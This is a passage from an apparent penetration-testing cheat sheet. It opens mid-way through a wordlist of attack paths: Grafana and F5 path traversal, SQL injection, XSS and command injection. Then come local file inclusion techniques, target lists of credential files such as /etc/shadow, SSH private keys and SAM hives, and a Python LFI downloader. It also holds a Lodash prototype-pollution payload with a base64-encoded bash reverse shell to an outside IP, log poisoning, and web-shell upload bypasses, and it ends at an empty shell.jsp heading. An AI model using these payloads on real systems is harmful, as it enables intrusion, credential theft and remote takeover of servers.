/public/plugins/barchart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/bargauge/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/canvas/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/cloudwatch/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/dashboard/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/dashlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/debug/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/elasticsearch/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/gauge/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/geomap/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/gettingstarted/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/grafana/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/graph/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/graphite/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/heatmap/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/histogram/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/icon/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/influxdb/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/jaeger/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/live/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/logs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/loki/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/mixed/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/mssql/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/mysql/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/news/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/nodeGraph/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/opentsdb/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/piechart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/pluginlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/postgres/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/prometheus/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/stat/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/state-timeline/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/status-history/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/table-old/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/table/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/tempo/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/testdata/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/text/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/timeseries/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/welcome/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/xychart/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/public/plugins/zipkin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
/publicadminer.php
/pyproject.toml
/query
/query-api
/query-explorer
/query-laravel
/radio/application/configs/application.ini
/rails/actions?error=ActiveRecord
/railsapp/config/storage.yml
/reach/sip.svc
/read_file
/readfile
/README.md
/readme.txt
/redmine/config/configuration.yml
/redmine/config/environment.rb
/redmine/config/initializers/secret_token.rb
/redmine/config/secrets.yml
/redmine/config/settings.yml
/redoc
/reminder.sh
/remote/login
/Reports/Pages/Folder.aspx
/ReportServer
/ReportServer/Pages/ReportViewer.aspx
/requesthandler/
/requesthandlerext/
/rest/api/2/dashboard?maxResults=100
/rest/api/2/project?maxResults=100
/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
/rest/api/latest/serverInfo
/rest/beta/repositories/go/group
/rest/tinymce/1/macro/preview
/rgs/
/rgsclients/
/Rhino.Commons.NHibernete.dll.config
/robomongo.json
/robots.txt%2e%2e%3B/
/robots.txt..%3B/
/robots.txt../admin/
/robots.txt..;/
/robots.txt/%2e%2e%3B/
/robots.txt/..%3B/
/robots.txt/../admin/
/robots.txt/..;/
/roundcube/logs/errors.log
/roundcube/logs/sendmail
/routes/error_log
/rpc/
/rpcwithcert/
/ruby/config/storage.yml
/run
/run.sh
/runFile.exe.config
/runningpods/
/s/sfsites/aura
/s3cmd.ini
/s3proxy.conf
/sap/bc/gui/sap/its/webgui
/sap/hana/xs/formLogin/login.html
/sap/wdisp/admin/public/default.html
/sapi/debug/default/view
/scheduler/
/sconfig.php
/schema
/schema.rb
/script
/search/members/?id`%3D520)%2f**%2funion%2f**%2fselect%2f**%2f1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2Cunhex%28%2770726f6a656374646973636f766572792e696f%27%29%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%23sqli=1
/search/token.json
/search?search_key={{1337*1338}}
/secret_token.rb
/secrets.yml
/secure/ConfigurePortalPages!default.jspa?view=popular
/secure/ContactAdministrators!default.jspa
/secure/Dashboard.jspa
/secure/ManageFilters.jspa?filter=popular&filterView=popular
/secure/ManageFilters.jspa?filterView=search&Search=Search&filterView=search&sortColumn=favcount&sortAscending=false
/secure/popups/UserPickerBrowser.jspa
/secure/QueryComponent!Default.jspa
/secure/ViewUserHover.jspa
/security.txt
/security.yml
/sell
/seminovos/application/configs/application.ini
/server
/server-status
/server.key
/server/storage/
/service-account-credentials.json
/service/rest/swagger.json
/service?Wsdl
/services.config
/servicedesk/customer/user/login
/servicedesk/customer/user/signup
/services/Version
/servlet/Satellite?destpage=%22%3Ch1xxx%3Cscriptalert(1)%3C%2Fscript&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError
/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https
/servlist.conf
/sessions/new
/settings.php.bak
/settings.php.dist
/settings.php.old
/settings.php.save
/settings.php.swp
/settings.php.txt
/settings.py
/settings.yml
/settings/settings.py
/setup.sh
/sfsites/aura
/sftp-config.json
/share/page/dologin
/shop/
/shop/application/configs/application.ini
/shutdown
/sidekiq
/site.sql
/site_cg/application/configs/application.ini
/sitecore/shell/sitecore.version.xml
/sitemanager.xml
/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/phpunit
/slr/application/configs/application.ini
/smb.conf
/solr/
/sphinx
/sphinx-graphiql
/spring
/sql.sql
/ssl/localhost.key
/sslmgr
/startup.sh
/stat.jsp?cmd=chcp+437+%7c+dir
/static%2e%2e%3B/
/static..%3B/
/static../.git/config
/static../admin/
/static..;/
/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
/static/%2e%2e%3B/
/static/..%3B/
/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
/static/..%5c..%5c..%5c..%5c..%5cetc/passwd
/static/..%5c..%5c..%5c..%5cetc/passwd
/static/..%5c..%5c..%5cetc/passwd
/static/..%5c..%5cetc/passwd
/static/..%5cetc/passwd
/static/../../../a/../../../../etc/passwd
/static/../admin/
/static/..;/
/static/api/swagger.json
/static/api/swagger.yaml
/static/emq.ico
/stats/summary
/StateNameServer.exe.config
/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
/status.php
/status/selfDiscovered/status
/storage.yml
/storage/
/storage/logs/laravel.log
/store/app/etc/local.xml
/subscriptions
/svnserve.conf
/swagger
/swagger-resources
/swagger-resources/restservices/v2/api-docs
/swagger-ui
/swagger-ui.html
/swagger-ui.js
/swagger-ui/swagger-ui.js
/swagger.json
/swagger.yaml
/swagger/api-docs
/swagger/index.html
/swagger/swagger
/swagger/swagger-ui.html
/swagger/swagger-ui.js
/swagger/ui/index
/swagger/ui/swagger-ui.js
/swagger/v1/api-docs
/swagger/v1/swagger.json
/swagger/v1/swagger.json/
/swagger/v1/swagger.yaml
/swagger/v2/api-docs
/swagger/v2/swagger.json
/swagger/v2/swagger.yaml
/sysmgmt/2015/bmc/info"  # Firmware Version and other info (iDRAC9
/Sysindex.config
/system
/system-diagnostics
/System.config
/systemstatus.xml
/Telerik.Web.UI.DialogHandler.aspx
/Telerik.Web.UI.DialogHandler.aspx?dp=1
/Telerik.Web.UI.DialogHandler.axd?dp=1
/Telerik.Web.UI.WebResource.axd?type=rau
/telescope/requests
/temp.php
/temp.sql
/test
/test.cgi
/test.php
/test/config/secrets.yml
/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd
/threaddump
/Thumbs.db
/tiki
/time.php
/tmui/login.jsp
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'
/tmui/tmui/login/welcome.jsp
/token.json
/tool/view/phpinfo.view.php
/tools/adminer.php
/toolsadminer.php
/trace
/Trace.axd
/translate.sql
/translations/en.json
/ucwa/
/ueditor/php/getRemoteImage.php
/ui/login.action
/ui/vault/auth
/unifiedmessaging/
/update.sh
/user
/user.ini
/user/0
/user/1
/user/2
/user/3
/user/login
/userportal/webpages/myaccount/login.jsp
/users.sql
/v0.1/
/v1
/v1.0/
/v1/
/v1/altair
/v1/api-docs
/v1/api/graphql
/v1/explorer
/v1/graph
/v1/graphiql
/v1/graphiql.css
/v1/graphiql.js
/v1/graphiql.min.css
/v1/graphiql.min.js
/v1/graphiql.php
/v1/graphiql/finland
/v1/graphql
/v1/graphql-explorer
/v1/graphql.php
/v1/graphql/console
/v1/graphql/schema.json
/v1/graphql/schema.xml
/v1/graphql/schema.yaml
/v1/playground
/v1/subscriptions
/v2
/v2/altair
/v2/api-docs
/v2/api/graphql
/v2/explorer
/v2/graph
/v2/graphiql
/v2/graphiql.css
/v2/graphiql.js
/v2/graphiql.min.css
/v2/graphiql.min.js
/v2/graphiql.php
/v2/graphiql/finland
/v2/graphql
/v2/graphql-explorer
/v2/graphql.php
/v2/graphql/console
/v2/graphql/schema.json
/v2/graphql/schema.xml
/v2/graphql/schema.yaml
/v2/keys/
/v2/playground
/v2/subscriptions
/v3
/v3/altair
/v3/api/graphql
/v3/explorer
/v3/graph
/v3/graphiql
/v3/graphiql.css
/v3/graphiql.js
/v3/graphiql.min.css
/v3/graphiql.min.js
/v3/graphiql.php
/v3/graphiql/finland
/v3/graphql
/v3/graphql-explorer
/v3/graphql.php
/v3/graphql/console
/v3/graphql/schema.json
/v3/graphql/schema.xml
/v3/graphql/schema.yaml
/v3/playground
/v3/subscriptions
/v4/altair
/v4/api/graphql
/v4/explorer
/v4/graph
/v4/graphiql
/v4/graphiql.css
/v4/graphiql.js
/v4/graphiql.min.css
/v4/graphiql.min.js
/v4/graphiql.php
/v4/graphiql/finland
/v4/graphql
/v4/graphql-explorer
/v4/graphql.php
/v4/graphql/console
/v4/graphql/schema.json
/v4/graphql/schema.xml
/v4/graphql/schema.yaml
/v4/playground
/v4/subscriptions
/Vagrantfile
/var/jwt/private.pem
/vendor/composer/installed.json
/vendor/phpunit/phpunit/phpunit
/vendor/webmozart/assert/.composer-auth.json
/verify.php?id=1&confirm_hash=
/version
/version.web
/views/ajax/autocomplete/user/a
/virtualems/Login.aspx
/VirtualEms/Login.aspx
/vpn/../vpns/cfg/smb.conf
/vpn/index.html
/wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd
/WEB-INF/web.xml
/Web.config
/web.config
/web/adminer.php
/web/debug/default/view
/web/home.html
/web/index.html
/web/manifest.json
/web/phpmyadmin/
/web/settings/settings.py
/web/static/c
/web_caps/webCapsConfig
/webadmin/out
/webadmin/start/
/webadmin/tools/systemstatus_remote.php
/webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f2022626d39755a5868706333526c626e513d22207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5
/webadminer.php
/webconfig.php
/webconfig.txt.php
/webalizer/
/webapi/v1/system/accountmanage/account
/webapp/?fccc0\><script>alert(1)</script>5f43d=1
/webclient/Login.xhtml
/webconsole/webpages/login.jsp
/webmail/
/webmail/?color=%22%3E%3Csvg/onload=alert(document.domain)%3E%22
/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc%5cpasswd
/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
/webmin/
/webpack.config.js
/webpack.mix.js
/WebReport/ReportServer
/webstats/awstats.pl
/webticket/
/webticket/webticketservice.svc
/webticket/webticketservice.svcabs/
/wgetrc
/whoAmI/
/wiki
/wp
/wp-config.php
/wp-includes/css/wp-config.php
/wp-includes/fonts/wp-config.php
/wp-includes/modules/wp-config.php
/ws2020/
/ws2021/
/ws_ftp.ini
/www.key
/www/delivery/afr.php?refresh=10000&\),10000000);alert(1337);setTimeout(alert(\
/xampp/phpmyadmin/
/xamlSyntax.config
/xmldata?item=all
/xmldata?item=CpqKey
/XmlPeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini&x=/validate.ashx?requri
/xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini
/xmlrpc.php
/xprober.php
/xunit.console.exe.config
/yarn.lock
/yii/vendor/phpunit/phpunit/phpunit
/zabbix.php?action=dashboard.view&dashboardid=1
/zend/vendor/phpunit/phpunit/phpunit
/zenphoto/zp
/zipkin/
/zm/?view=log
/zp
/zp/zp
```

## Local File Inclusion (LFI)

```console
$ http://<RHOST>/<FILE>.php?file=
$ http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
$ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
```

### Until PHP 5.3

```console
$ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
```

### Root Cause Function

```console
get_file_contents
```

### Null Byte

```console
%00
0x00
```

#### Example

```console
http://<RHOST>/index.php?lang=/etc/passwd%00
```

### Encoded Traversal Strings

```console
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

### Chinese Dot Encoding

```console
%E3%80%82
```

#### Single Sign-On (SSO) Redirect

```console
https://<RHOST>/auth/sso/init/<username>@<--- CUT FOR BREVITY --->=https://google.com%E3%80%82<LHOST>/
```

### Web Application Firewall (WAF) Bypass

```console
/e*c/p*s*d    // /etc/passwd
```

### php://filter Wrapper

> https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter

```console
url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
```

```console
$ http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
$ http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
$ base64 -d <FILE>.php
```

### Read Process via Burp Suite

```console
GET /index.php?page=../../../../../../../proc/425/cmdline HTTP/1.1
```

### Read Process Allocations via Burp Suite

```console
GET /index.php?page=../../../../../../../proc/425/maps HTTP/1.1
```

### Parameters

```console
cat
dir
img
action
board
date
detail
file
files
download
path
folder
prefix
include
page
------------------------------------------------------------------inc
locate
show
doc
site
type
view
content
document
layout
mod
conf
```

### Django, Rails, or Node.js Web Application Header Values

```console
Accept: ../../../../.././../../../../etc/passwd{{
Accept: ../../../../.././../../../../etc/passwd{%0D
Accept: ../../../../.././../../../../etc/passwd{%0A
Accept: ../../../../.././../../../../etc/passwd{%00
Accept: ../../../../.././../../../../etc/passwd{%0D{{
Accept: ../../../../.././../../../../etc/passwd{%0A{{
Accept: ../../../../.././../../../../etc/passwd{%00{{
```

### Linux Files

```console
/app/etc/local.xml
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-available/000-default.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/knockd.conf
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cmdline
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/<PID>/cmdline
/proc/<PID>/maps
/proc/sched_debug
/proc/self/cwd/app.py
/proc/self/environ
/proc/self/net/arp
/proc/stat
/proc/swaps
/proc/version
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/html<VHOST>/__init__.py
/var/www/html/db_connect.php
/var/www/html/utils.php
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

### Windows Files

```console
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

### LFI File Downloader

#### lfidownloader.py

```python
import requests
from  pathlib import Path
import base64

# Files to Download:
# /proc/sched_debug
# /proc/<<PID>>/maps
# /usr/lib/x86_64-linux-gnu/libc-2.31.so
# /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6

base64_content    = "php://filter/convert.base64-encode/resource="
paint_text_content = "php://filter/read=string/resource="

remote  = "/proc/sched_debug"
result  = requests.get(f"http://<RHOST>/index.php?page={base64_content}{remote}").content

try:
  with open(f"temp/{Path(remote).name}", "wb") as file:
      file.write(base64.b64decode(result))
      file.close()
except:
  pass

print(f"Received : \n {remote} ")
```

## Lodash

> https://github.com/lodash/lodash

### Payload

```console
$ curl -X PUT -H 'Content-Type: application/json' http://127.0.0.1:<RPORT> --data '{"auth":{"name":"<USERNAME>","password":"<PASSWORD>"},"constructor":{"__proto__":{"canUpload":true,"canDelete":true}}}'
```

### Reverse Shell Payload

```console
$ curl --header "Content-Type: application/json" --request POST http://127.0.0.1:<RPORT>/upload --data '{"auth":{"name":"<USERNAME>","password":"<PASSWORD>"},"filename":"& echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC85MDAzIDA+JjEK|base64 -d|bash"}'
```

## Log Poisoning

### SSH auth.log Poisoning

```console
$ ssh "<?php phpinfo();?>"@<LHOST>
$ http://<RHOST>/view.php?page=../../../../../var/log/auth.log
```

## Magic Bytes

### GIF

```console
GIF8;
GIF87a
```

### JPG

```console
\xff\xd8\xff
```

### PDF

```console
%PDF-1.5
%
```

```console
%PDF-1.7
%
```

### PNG

```console
\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
```

### Examples

#### GIF Magic Bytes

```console
GIF89a;
<?php
  <PAYLOAD>
?>
```

#### JAVA Web Shell Upload Filter Bypass

```console
$ printf "\xff\xd8\xff\n" > <FILE>.jpg
```

##### shell.jsp

```javascript
